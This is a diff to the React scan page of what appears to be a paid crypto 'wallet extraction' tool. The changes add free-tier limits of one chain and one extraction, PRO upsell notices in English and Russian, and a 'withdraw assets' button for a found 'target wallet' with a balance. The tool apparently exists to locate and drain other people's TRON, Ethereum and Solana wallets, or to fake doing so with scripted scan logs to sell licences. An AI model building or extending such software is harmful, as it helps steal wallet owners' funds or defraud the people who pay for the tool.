@@ -70,12 +70,34 @@ export const ScanPage: React.FC<ScanPageProps> = ({
   // Live Crypto Prices
   const { prices: livePrices } = useLivePrices();
 
-  // Networks selected
-  const [selectedNetworks, setSelectedNetworks] = useState<Network[]>([
-    'TRON',
-    'ETHEREUM',
-    'SOLANA',
-  ]);
+  // Free community tier limit: only 1 wallet extraction allowed
+  const isCommunityPlan = activePlan === 'community';
+  const isLimitReached = isCommunityPlan && communityExtractsCount >= 1;
+
+  // Networks selected: Community starts with 1 network ('TRON'), PRO/Enterprise with all 3
+  const [selectedNetworks, setSelectedNetworks] = useState<Network[]>(() =>
+    isCommunityPlan ? ['TRON'] : ['TRON', 'ETHEREUM', 'SOLANA']
+  );
+
+  // Enforce single network constraint whenever user is on Community tier
+  useEffect(() => {
+    if (isCommunityPlan && selectedNetworks.length > 1) {
+      setSelectedNetworks([selectedNetworks[0] || 'TRON']);
+    }
+  }, [isCommunityPlan]);
+
+  const [networkNotice, setNetworkNotice] = useState<string | null>(null);
+  const networkNoticeTimerRef = useRef<number | null>(null);
+
+  const showNetworkNotice = useCallback((msg: string) => {
+    if (networkNoticeTimerRef.current) {
+      clearTimeout(networkNoticeTimerRef.current);
+    }
+    setNetworkNotice(msg);
+    networkNoticeTimerRef.current = window.setTimeout(() => {
+      setNetworkNotice(null);
+    }, 4500);
+  }, []);
 
   // Scan state
   const [scanState, setScanState] = useState<ScanState>('IDLE');
@@ -100,7 +122,7 @@ export const ScanPage: React.FC<ScanPageProps> = ({
     },
     {
       id: 'init-2',
-      text: 'Network clusters ready [TRC-20, ERC-20, SOL]',
+      text: isCommunityPlan ? 'Single-chain network engine ready [TRON]' : 'Network clusters ready [TRC-20, ERC-20, SOL]',
       statusType: 'success',
       timestamp: '12:00:02',
     },
@@ -161,13 +183,29 @@ export const ScanPage: React.FC<ScanPageProps> = ({
     return id;
   };
 
-  // Free community tier limit: only 1 wallet extraction allowed
-  const isCommunityPlan = activePlan === 'community';
-  const isLimitReached = isCommunityPlan && communityExtractsCount >= 1;
-
-  // Toggle network selection (ensure at least one is selected)
+  // Toggle network selection (Community: strictly 1 chain; PRO/Enterprise: multi-chain parallel)
   const handleToggleNetwork = useCallback((network: Network) => {
     if (isScanning) return;
+
+    if (isCommunityPlan) {
+      if (selectedNetworks.includes(network)) {
+        showNetworkNotice(
+          language === 'ru'
+            ? 'Тариф Community ограничен 1 активной сетью. Для параллельного поиска по 3 сетям требуется PRO.'
+            : 'Community tier is limited to 1 active chain. Multi-network parallel clustering requires PRO.'
+        );
+        return;
+      } else {
+        setSelectedNetworks([network]);
+        showNetworkNotice(
+          language === 'ru'
+            ? `Выбрана сеть ${network}. Параллельное сканирование 3 сетей доступно в тарифе PRO.`
+            : `Active chain switched to ${network}. Parallel multi-chain scanning across all 3 networks requires PRO.`
+        );
+        return;
+      }
+    }
+
     setSelectedNetworks((prev) => {
       if (prev.includes(network)) {
         return prev.length > 1 ? prev.filter((n) => n !== network) : prev;
@@ -175,7 +213,7 @@ export const ScanPage: React.FC<ScanPageProps> = ({
         return [...prev, network];
       }
     });
-  }, [isScanning]);
+  }, [isScanning, isCommunityPlan, selectedNetworks, language, showNetworkNotice]);
 
   const handleOpenTransferModal = useCallback((wallet: ExtractedWallet) => {
     setTransferModalWallet(wallet);
@@ -448,7 +486,9 @@ export const ScanPage: React.FC<ScanPageProps> = ({
     matchTriggeredSessionRef.current = null;
 
     const safeNetworks =
-      selectedNetworks && selectedNetworks.length > 0
+      isCommunityPlan
+        ? ([selectedNetworks[0] || 'TRON'] as Network[])
+        : selectedNetworks && selectedNetworks.length > 0
         ? selectedNetworks
         : (['TRON', 'ETHEREUM', 'SOLANA'] as Network[]);
 
@@ -588,7 +628,7 @@ export const ScanPage: React.FC<ScanPageProps> = ({
               ...prev.slice(-14),
               {
                 id: `scan-commence-${Date.now()}`,
-                text: `> Commencing multi-core extraction stream on [${safeNetworks.join(', ')}]...`,
+                text: `> Commencing ${safeNetworks.length > 1 ? 'multi-core parallel' : 'single-core'} extraction stream on [${safeNetworks.join(', ')}]...`,
                 statusType: 'system',
                 timestamp: new Date().toLocaleTimeString(),
               },
@@ -871,6 +911,9 @@ export const ScanPage: React.FC<ScanPageProps> = ({
         selectedNetworks={selectedNetworks}
         onToggleNetwork={handleToggleNetwork}
         disabled={isScanning}
+        activePlan={activePlan}
+        onOpenLicensing={onOpenLicensing}
+        notice={networkNotice}
       />
 
       {/* 5. Main Action CTA Buttons */}
@@ -886,11 +929,22 @@ export const ScanPage: React.FC<ScanPageProps> = ({
               className="w-full py-4 px-6 rounded-2xl flex items-center justify-center gap-3 relative overflow-hidden font-extrabold tracking-wider text-sm uppercase bg-gradient-to-r from-[#00E676] via-[#00C853] to-[#00E676] text-black shadow-[0_0_30px_rgba(0,230,118,0.5)] active:scale-98 transition-all cursor-pointer animate-pulse"
             >
               <Sparkles className="w-5 h-5 text-black" />
-              <span>{t('initiateTransfer')}: {foundMatch.balance} {foundMatch.symbol} (${foundMatch.balanceUsd.toLocaleString()})</span>
+              <span>{t('withdrawAssets')}: {foundMatch.balance} {foundMatch.symbol} (${foundMatch.balanceUsd.toLocaleString()})</span>
             </button>
 
             <button
-              onClick={handleStartScan}
+              onClick={() => {
+                const isMatchDispatched = foundMatch.status === 'DISPATCHED' || parseFloat(String(foundMatch.balance || '0').replace(/,/g, '')) === 0;
+                if (!isMatchDispatched) {
+                  const confirmMsg = language === 'ru' 
+                    ? 'У вас есть найденный кошелек с балансом. Начать новое сканирование?' 
+                    : 'A target wallet is ready to withdraw. Starting a new scan will archive this session. Continue?';
+                  if (!window.confirm(confirmMsg)) {
+                    return;
+                  }
+                }
+                handleStartScan();
+              }}
               disabled={isVerifying}
               type="button"
               className="w-full py-3 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-[#CBD5E1] hover:text-white font-mono text-xs uppercase tracking-wider transition-colors cursor-pointer flex items-center justify-center gap-2 disabled:opacity-50"
@@ -991,7 +1045,7 @@ export const ScanPage: React.FC<ScanPageProps> = ({
                   {t('limitReachedTitle')}
                 </h3>
                 <span className="text-[10px] font-mono text-[#FFC107] uppercase">
-                  Community Plan Cap Exceeded
+                  {t('communityCapExceeded')}
                 </span>
               </div>
 
